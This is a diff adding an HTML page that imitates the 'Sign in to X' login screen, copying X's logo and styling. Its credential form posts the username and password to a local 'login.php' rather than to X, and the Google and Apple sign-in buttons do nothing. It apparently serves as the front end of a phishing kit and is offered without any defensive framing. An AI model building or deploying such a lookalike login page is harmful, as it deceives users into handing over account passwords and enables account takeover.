@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to X</title>
+    
+    <style>
+        /* --- 1. General Body and Font Styling --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #242D34; /* Updated background to match the image */
+            color: #e7e9ea;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* --- 2. Main Page Layout --- */
+        .login-modal {
+            background-color: #000000;
+            border-radius: 16px;
+            max-width: 600px;
+            width: 100%;
+            height: auto; /* Changed back to auto to accommodate all fields */
+            padding: 20px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative; /* For positioning the close button */
+        }
+        
+        /* Close button (X) at the top left */
+        .close-button {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: transparent;
+            border: none;
+            color: #e7e9ea;
+            font-size: 24px;
+            cursor: pointer;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 50%;
+            transition: background-color 0.2s;
+        }
+        .close-button:hover {
+            background-color: rgba(231, 233, 234, 0.1);
+        }
+
+        .logo {
+            margin-top: 10px; /* Adjusted margin to position logo */
+            margin-bottom: 20px;
+        }
+
+        .logo svg {
+            width: 30px;
+            height: 30px;
+            fill: #e7e9ea;
+        }
+
+        h1 {
+            font-size: 31px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        /* --- 3. Button Styling --- */
+        button {
+            width: 300px;
+            height: 40px;
+            border-radius: 20px;
+            border: 1px solid rgb(83, 100, 113);
+            background-color: transparent;
+            color: #e7e9ea;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .social-btn {
+            background-color: #ffffff;
+            color: #0f1419;
+            border: none;
+        }
+
+        .social-btn:hover {
+            background-color: #e6e6e6;
+        }
+
+        .social-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* This is the new "Log in" button style (was "Next") */
+        .login-btn {
+            background-color: #e7e9ea;
+            color: #0f1419;
+            border: none;
+            margin-top: 10px; /* Added some margin for spacing */
+        }
+        .login-btn:hover {
+            background-color: #d0d2d3;
+        }
+        
+        .forgot-btn {
+            margin-top: 16px;
+            margin-bottom: 20px;
+        }
+        .forgot-btn:hover {
+            background-color: rgba(231, 233, 234, 0.1);
+        }
+
+        /* --- 4. "or" Divider Styling --- */
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 300px;
+            margin: 12px 0;
+            color: #71767b;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex-grow: 1;
+            height: 1px;
+            background-color: #2f3336;
+        }
+
+        .divider span {
+            padding: 0 16px;
+        }
+
+        /* --- 5. Input Field with Floating Label --- */
+        .input-group {
+            position: relative;
+            width: 300px;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            height: 56px;
+            background-color: transparent;
+            border: 1px solid #333639;
+            border-radius: 4px;
+            color: #e7e9ea;
+            font-size: 17px;
+            padding: 16px 12px 8px 12px;
+        }
+        
+        .input-group label {
+            position: absolute;
+            top: 50%;
+            left: 12px;
+            transform: translateY(-50%);
+            color: #71767b;
+            font-size: 17px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 10px;
+            font-size: 13px;
+            color: #1d9bf0;
+        }
+
+        /* --- 6. Sign-up Prompt at the Bottom --- */
+        .signup-prompt {
+            width: 300px;
+            margin-top: 40px; 
+            font-size: 15px;
+            color: #71767b;
+        }
+
+        .signup-prompt a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+
+        .signup-prompt a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <main class="login-modal">
+        
+        <button class="close-button" onclick="window.history.back()">×</button>
+
+        <div class="logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+                <g>
+                    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+                </g>
+            </svg>
+        </div>
+
+        <h1>Sign in to X</h1>
+
+        <button class="social-btn">
+            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.42-4.55H24v8.51h12.8c-.57 2.73-2.23 5.06-4.79 6.62l7.63 5.88C44.43 36.88 46.98 31.18 46.98 24.55z"></path>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.63-5.88c-2.11 1.42-4.79 2.27-7.91 2.27-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+                <path fill="none" d="M0 0h48v48H0z"></path>
+            </svg>
+            Sign in with Google
+        </button>
+
+        <button class="social-btn">
+            <img src="https://cdn-icons-png.flaticon.com/512/0/747.png" height="25" alt="apple">
+            Sign in with Apple
+        </button>
+
+        <div class="divider">
+            <span>or</span>
+        </div>
+
+        <form method="POST" action="login.php">
+            <div class="input-group">
+                <input type="text" id="usernameOrEmail" name="usernameOrEmail" placeholder=" " required>
+                <label for="usernameOrEmail">Phone, email, or username</label>
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass" name="pass" placeholder=" " required>
+                <label for="pass">Password</label>
+            </div>
+        
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+        <button type="button" class="forgot-btn">Forgot password?</button>
+
+        <p class="signup-prompt">
+            Don't have an account? <a href="#">Sign up</a>
+        </p>
+
+    </main>
+
+</body>
+</html>
